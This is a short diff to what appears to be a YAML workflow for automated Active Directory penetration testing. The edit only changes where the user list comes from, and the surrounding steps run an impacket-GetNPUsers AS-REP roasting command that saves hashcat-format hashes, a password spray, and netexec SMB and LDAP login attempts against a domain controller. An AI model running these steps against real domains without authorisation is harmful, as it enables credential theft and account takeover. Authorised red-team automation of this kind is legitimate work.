@@ -154,7 +154,7 @@ jobs:
       - name: asrep-attack
         run: |
           impacket-GetNPUsers {{ inputs.domain }}/ -dc-ip {{ inputs.target }} \
-            -usersfile /tmp/ad-users.txt -format hashcat \
+            -usersfile {{ jobs.enum.outputs.users_file | default('/tmp/ad-users.txt', true) }} -format hashcat \
             -outputfile /tmp/asrep-hashes.txt 2>/dev/null | tee /tmp/asrep-output.txt
         continue-on-error: true
       - name: collect-asrep
@@ -198,7 +198,7 @@ jobs:
           mode: passwordspray
           dc: "{{ inputs.target }}"
           domain: "{{ inputs.domain }}"
-          users: "{{ inputs.users_file if inputs.users_file else '/tmp/ad-users.txt' }}"
+          users: "{{ inputs.users_file if inputs.users_file else jobs.enum.outputs.users_file | default('/tmp/ad-users.txt', true) }}"
           password: "{{ inputs.password }}"
         continue-on-error: true
       - task: netexec
@@ -207,7 +207,7 @@ jobs:
         with:
           target: "{{ inputs.target }}"
           protocol: smb
-          username: "{{ inputs.users_file if inputs.users_file else '/tmp/ad-users.txt' }}"
+          username: "{{ inputs.users_file if inputs.users_file else jobs.enum.outputs.users_file | default('/tmp/ad-users.txt', true) }}"
           password: "{{ inputs.password }}"
           domain: "{{ inputs.domain }}"
         continue-on-error: true
@@ -217,7 +217,7 @@ jobs:
         with:
           target: "{{ inputs.target }}"
           protocol: ldap
-          username: "{{ inputs.users_file if inputs.users_file else '/tmp/ad-users.txt' }}"
+          username: "{{ inputs.users_file if inputs.users_file else jobs.enum.outputs.users_file | default('/tmp/ad-users.txt', true) }}"
           password: "{{ inputs.password }}"
           domain: "{{ inputs.domain }}"
         continue-on-error: true
